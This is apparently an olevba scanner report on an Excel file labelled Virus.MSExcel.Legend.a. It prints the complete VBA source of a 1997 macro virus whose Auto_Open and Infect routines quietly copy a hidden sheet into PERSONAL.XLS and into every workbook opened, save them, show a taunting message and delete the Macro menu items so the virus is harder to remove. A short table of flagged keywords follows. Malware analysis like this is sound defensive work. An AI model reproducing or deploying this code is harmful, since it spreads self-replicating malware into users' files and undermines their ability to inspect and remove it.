olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Legend.a-66dcf392af8121ab788bf917f775be62d27c49f5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Legend.bas 
in file: Virus.MSExcel.Legend.a-66dcf392af8121ab788bf917f775be62d27c49f5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Legend'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' *****************************************************************
' Name    : ExcelMacro.Legend
' Origin  : England
' Created : January 01, 1997
' Author  : Pyro [VBB]
' *****************************************************************
Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
Application.OnSheetActivate = "Infect"
End Sub

Sub Infect()
Attribute Infect.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo ErrorHandler
If Application.UserName = "Pyro" And Application.OrganizationName = "VBB" Then GoTo ErrorHandler
Application.ScreenUpdating = False
Application.DisplayAlerts = False
Installed = 0
If ThisWorkbook.Name <> "PERSONAL.XLS" Then
If Dir(Application.StartupPath + "\PERSONAL.XLS") = "PERSONAL.XLS" Then Installed = 1
If Installed = 1 Then
GoTo ErrorHandler
Else
Workbooks.Add.SaveAs Filename:=Application.StartupPath + "\PERSONAL.XLS"
Workbooks(ThisWorkbook.Name).Sheets("Legend").Copy Before:=Workbooks("PERSONAL.XLS").Sheets(1)
Workbooks("PERSONAL.XLS").Sheets("Legend").Visible = False
Workbooks("PERSONAL.XLS").Save
Windows("PERSONAL.XLS").Visible = False
End If
Else
Windows("PERSONAL.XLS").Visible = False
For I = 1 To Workbooks(ActiveWorkbook.Name).Sheets.Count
If Workbooks(ActiveWorkbook.Name).Sheets(I).Name = "Legend" Then Installed = 1
Next
If Installed = 1 Then
GoTo ErrorHandler
Else
Workbooks("PERSONAL.XLS").Sheets("Legend").Copy Before:=Workbooks(ActiveWorkbook.Name).Sheets(1)
Workbooks(ActiveWorkbook.Name).Sheets("Legend").Visible = False
Workbooks(ActiveWorkbook.Name).Save
Windows("PERSONAL.XLS").Visible = False
End If
End If
Workbooks("PERSONAL.XLS").Save
Application.ScreenUpdating = True
Application.DisplayAlerts = True
If Day(Now()) = Int((31 * Rnd) + 1) Then MsgBox "You've Been Infected By Legend!", 16, "Pyro [VBB]"
MenuBars(xlWorksheet).Menus("Tools").MenuItems("&Macro...").Delete
MenuBars(xlModule).Menus("Tools").MenuItems("&Macro...").Delete
MenuBars(xlNoDocuments).Menus("Tools").MenuItems("&Macro...").Delete
MenuBars(xlInfo).Menus("Tools").MenuItems("&Macro...").Delete
MenuBars(xlChart).Menus("Tools").MenuItems("&Macro...").Delete
ErrorHandler:
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - Visual Basic module, hidden -  Legen
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

